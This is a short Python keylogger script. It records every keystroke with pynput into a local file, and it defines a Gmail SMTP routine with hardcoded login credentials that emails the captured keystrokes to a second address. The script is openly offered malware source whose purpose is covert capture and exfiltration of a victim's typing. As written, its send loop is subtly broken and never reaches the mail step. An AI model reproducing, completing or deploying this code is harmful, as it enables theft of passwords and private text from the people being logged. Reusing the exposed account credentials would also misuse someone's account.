from pynput.keyboard import Listener
import smtplib
import time

def writeitdown(key):
    k = str(key)
    k = k.replace("'","")
    if k =="Key.enter":
        k = "\n"
    if k == "Key.space":
        k = " "
    with open("haha.txt", "a") as p:
        p.write(k)

def send_mail(msg):
    server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
    server.login("cena73229@gmail.com", "DOTS1234")
    server.sendmail("cena73229@gmail.com",
                    "swastikaryal111@gmail.com",
                    msg )
    server.quit()


i=0
with Listener(on_press=writeitdown) as l:
    l.join()
    i=i+1
    if i%5==0:
        gg = open("haha.txt", "r")
        op = gg.read()
        send_mail(op)

















